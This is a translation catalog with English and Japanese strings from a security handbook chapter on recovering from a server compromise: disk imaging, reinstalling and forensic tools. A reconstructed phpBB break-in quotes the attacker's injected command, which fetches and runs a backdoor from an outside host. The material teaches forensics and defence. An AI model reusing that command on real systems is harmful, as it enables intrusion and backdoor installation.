Repository: Neamar/KISS
Catalog: */14_security.po
Languages: ja_jp

source: Once the “dynamic” elements have been saved, the next step is to store a complete image of the hard-disk. Making such an image is impossible if the filesystem is still evolving, which is why it must be remounted read-only. The simplest solution is often to halt the server brutally (after running <command>sync</command>) and reboot it on a rescue CD. Each partition should be copied with a tool such as <command>dd</command>; these images can be sent to another server (possibly with the very convenient <command>nc</command> tool). Another possibility may be even simpler: just get the disk out of the machine and replace it with a new one that can be reformatted and reinstalled.
ja_jp: 「動的な」要素の保存が完了したら、次にハードディスクの完全なイメージを保存します。ファイルシステムの内容が書き変わっている間はそのようなイメージを作ることは不可能です。そのため、ファイルシステムを読み込み専用で再マウントする必要があります。最も簡単な解決策として、(<command>sync</command> を実行した後) サーバを無理矢理停止し、レスキュー CD を使って再起動する事がよく行われます。各パーティションは <command>dd</command> などのツールを使ってコピーされるべきです; これらのイメージを他のサーバに送信する事が可能です (場合によってはとても便利な <command>nc</command> ツールを使って送信します)。他のより簡単な方法もあります: 不正侵入されたマシンからディスクを取り出して、再フォーマットおよび再インストールしても問題ない新しいディスクで置き換えます。

source: Re-installing
ja_jp: 再インストール

source: <primary>backdoor</primary>
ja_jp: <primary>バックドア</primary>

source: The server should not be brought back on line without a complete reinstallation. If the compromise was severe (if administrative privileges were obtained), there is almost no other way to be sure that we're rid of everything the attacker may have left behind (particularly <emphasis>backdoors</emphasis>). Of course, all the latest security updates must also be applied so as to plug the vulnerability used by the attacker. Ideally, analyzing the attack should point at this attack vector, so one can be sure of actually fixing it; otherwise, one can only hope that the vulnerability was one of those fixed by the updates.
ja_jp: 不正侵入されたサーバを、完全に再インストールする前に、オンラインに戻すべきではありません。不正侵入が深刻な場合 (管理者権限が奪われていた場合)、再インストール以外に攻撃者が残したすべて (特に<emphasis>バックドア</emphasis>) が一掃された事を保証する方法はほぼ存在しません。もちろん、攻撃者の使う脆弱性を塞ぐために、すべての最新のセキュリティ更新を適用しなければいけません。理想的に言えば、不正侵入の形跡を解析する事で、この最新のセキュリティ更新によって塞がれる脆弱性を使って不正侵入が行われた事が明らかになるべきです。そうすれば、実際に攻撃ベクトルが修正された事を保証する事が可能です; さもなければ、更新によって不正侵入の足掛かりとなった脆弱性が修正された事を期待することしかできません。

source: Reinstalling a remote server is not always easy; it may involve assistance from the hosting company, because not all such companies provide automated reinstallation systems. Care should be taken not to reinstall the machine from backups taken later than the compromise. Ideally, only data should be restored, the actual software should be reinstalled from the installation media.
ja_jp: リモートサーバの再インストールは常に簡単というわけではありません; ホスティング会社の手助けが必要になる場合があります。なぜなら、ホスティング会社のすべてが自動再インストールシステムを提供しているとは限らないからです。不正侵入後に取られたバックアップからマシンを再インストールしないように注意してください。理想的に言えば、データだけを回復するべきです。実際のソフトウェアはインストールメディアから再インストールされるべきです。

source: Forensic Analysis
ja_jp: フォレンジック解析

source: Now that the service has been restored, it is time to have a closer look at the disk images of the compromised system in order to understand the attack vector. When mounting these images, care should be taken to use the <literal>ro,nodev,noexec,noatime</literal> options so as to avoid changing the contents (including timestamps of access to files) or running compromised programs by mistake.
ja_jp: サービスが回復したら、攻撃ベクトルを理解するために不正侵入されたシステムのディスクイメージの詳細な調査を開始します。これらのイメージをマウントする際に、<literal>ro,nodev,noexec,noatime</literal> オプションを使うことに注意してください。これは (ファイルにアクセスしたタイムスタンプを含めて) 内容の変更を防ぎ、誤って破壊されたプログラムを実行する事を防ぐ意味合いがあります。

source: Retracing an attack scenario usually involves looking for everything that was modified and executed:
ja_jp: 通常、攻撃シナリオを辿るには、変更されて実行されたすべてを探し出す事が必要です。

source: <filename>.bash_history</filename> files often provide for a very interesting read;
ja_jp: <filename>.bash_history</filename> ファイルには、極めて興味深い内容が含まれます;

source: so does listing files that were recently created, modified or accessed;
ja_jp: 最近作成、修正、アクセスされた listing ファイルも同様です;

source: the <command>strings</command> command helps identifying programs installed by the attacker, by extracting text strings from a binary;
ja_jp: <command>strings</command> コマンドは攻撃者がインストールしたプログラムを識別する助けになります。このコマンドはバイナリからテキスト文字列を抽出します;

source: the log files in <filename>/var/log/</filename> often allow reconstructing a chronology of events;
ja_jp: <filename>/var/log/</filename> 内のログファイルを使えば出来事の経過を辿る事が可能です;

source: special-purpose tools also allow restoring the contents of potentially deleted files, including log files that attackers often delete.
ja_jp: 特殊目的のツールを使うことで、潜在的に削除されたファイルの内容を復元する事が可能です。このファイルには攻撃者が削除したログファイルなどが含まれます。

source: Some of these operations can be made easier with specialized software. In particular, <emphasis>The Coroner Toolkit</emphasis> (in the <emphasis role="pkg">tct</emphasis> package) is a collection of such tools. It includes several tools; amongst these, <command>grave-robber</command> can collect data from a running compromised system, <command>lazarus</command> extracts often interesting data from non-allocated regions on disks, and <command>pcat</command> can copy the memory used by a process; other data extraction tools are also included. <indexterm><primary>The Coroner Toolkit</primary></indexterm>
ja_jp: これらの操作は専用ソフトウェアを使うことで簡単に実行する事が可能です。特に、<emphasis>The Coroner Toolkit</emphasis> (<emphasis role="pkg">tct</emphasis> パッケージに含まれます) は専用ソフトウェアツール集です。<emphasis>The Coroner Toolkit</emphasis> には幾つかのツールが含まれます; 中でも、起動中の不正侵入されたシステムからデータを収集する事が可能な <command>grave-robber</command>、ディスクの未使用領域から興味深いデータを抽出する <command>lazarus</command>、プロセスが使っているメモリの複製を取る事が可能な <command>pcat</command> は注目に値します。他のデータ抽出ツールも含まれています。<indexterm><primary>The Coroner Toolkit</primary></indexterm>

source: The <emphasis role="pkg">sleuthkit</emphasis> package provides a few other tools to analyze a filesystem. Their use is made easier by the <emphasis>Autopsy Forensic Browser</emphasis> graphical interface (in the <emphasis role="pkg">autopsy</emphasis> package). <indexterm><primary>Autopsy Forensic Browser</primary></indexterm>
ja_jp: <emphasis role="pkg">sleuthkit</emphasis> パッケージはファイルシステムを解析する別のツールを提供します。これは <emphasis>Autopsy Forensic Browser</emphasis> グラフィカルインターフェース (<emphasis role="pkg">autopsy</emphasis> パッケージに含まれます) から簡単に使う事が可能です。<indexterm><primary>Autopsy Forensic Browser</primary></indexterm>

source: Reconstituting the Attack Scenario
ja_jp: 攻撃シナリオの再構成

source: All the elements collected during the analysis should fit together like pieces in a jigsaw puzzle; the creation of the first suspect files is often correlated with logs proving the breach. A real-world example should be more explicit than long theoretical ramblings.
ja_jp: 解析中に収集されたすべての要素はジグソーパズルのピースの如く組み合わさるべきです; 最初の疑わしいファイルの作成は破壊を証明するログと関係があります。実世界の例は長ったらしい理論よりもより明白であるべきです。

source: The following log is an extract from an Apache <filename>access.log</filename>:
ja_jp: 以下のログは Apache <filename>access.log</filename> から抽出したものです:

source: This example matches exploitation of an old security vulnerability in phpBB. <ulink type="block" url="http://secunia.com/advisories/13239/" /> <ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636" />
ja_jp: これは phpBB の古いセキュリティ脆弱性を突いた例です。<ulink type="block" url="http://secunia.com/advisories/13239/" /> <ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636" />

source: Decoding this long URL leads to understanding that the attacker managed to run some PHP code, namely: <command>system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</command>. Indeed, a <filename>bd</filename> file was found in <filename>/tmp/</filename>. Running <command>strings /mnt/tmp/bd</command> returns, among other strings, <literal>PsychoPhobia Backdoor is starting...</literal>. This really looks like a backdoor.
ja_jp: 長い URL を復号することで、攻撃者が幾つかの PHP コードを実行しようと試みた事が理解できます。はっきり言うと: <command>system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</command> です。確かに、<filename>bd</filename> ファイルが <filename>/tmp/</filename> の中で見つかりました。<command>strings /mnt/tmp/bd</command> を実行したところ、他の文字列に混じって、<literal>PsychoPhobia Backdoor is starting...</literal> が返されました。これはまさにバックドアのように見えます。

source: Some time later, this access was used to download, install and run an IRC <emphasis>bot</emphasis> that connected to an underground IRC network. The bot could then be controlled via this protocol and instructed to download files for sharing. This program even has its own log file:
ja_jp: 暫くの後、このアクセスは地下 IRC ネットワークに接続する IRC <emphasis>ボット</emphasis>をダウンロード、インストール、実行するために使われました。このボットは IRC プロトコルを介して制御され、共有するファイルをダウンロードする指示を与えられました。このプログラムは自分自身のログファイルを持っています:

source: These traces show that two video files have been stored on the server by way of the 82.50.72.202 IP address.
ja_jp: ログに残された痕跡によれば、82.50.72.202 IP アドレスを経由して 2 つのビデオファイルがサーバ上に保存された事が判ります。

source: In parallel, the attacker also downloaded a pair of extra files, <filename>/tmp/pt</filename> and <filename>/tmp/loginx</filename>. Running these files through <command>strings</command> leads to strings such as <foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> and <foreignphrase>Now wait for suid shell...</foreignphrase>. These look like programs exploiting local vulnerabilities to obtain administrative privileges. Did they reach their target? In this case, probably not, since no files seem to have been modified after the initial breach.
ja_jp: 並行して、攻撃者はさらにファイルをダウンロードしました。<filename>/tmp/pt</filename> と <filename>/tmp/loginx</filename> です。<command>strings</command> を介してこれらのファイルを調べると、<foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> や <foreignphrase>Now wait for suid shell...</foreignphrase> などの文字列が見つかりました。プログラムは管理者権限を取得するためにローカルの脆弱性を不正利用しているように見えます。攻撃者は目標を達成したでしょうか? この場合、おそらくまだでしょう。なぜなら、最初の破壊行為の後どのファイルも修正されていなかったからです。

source: In this example, the whole intrusion has been reconstructed, and it can be deduced that the attacker has been able to take advantage of the compromised system for about three days; but the most important element in the analysis is that the vulnerability has been identified, and the administrator can be sure that the new installation really does fix the vulnerability.
ja_jp: この例では、不正侵入のすべてが再構成されました。そして、攻撃者は不正侵入されたシステムを 3 日間に渡って悪用する事ができたと推測する事が可能です; しかし、解析で明らかになった最も重要な要素は脆弱性の内容です。管理者は新規インストールによって完全にこの種の脆弱性が修正された事を保証する事が可能です。
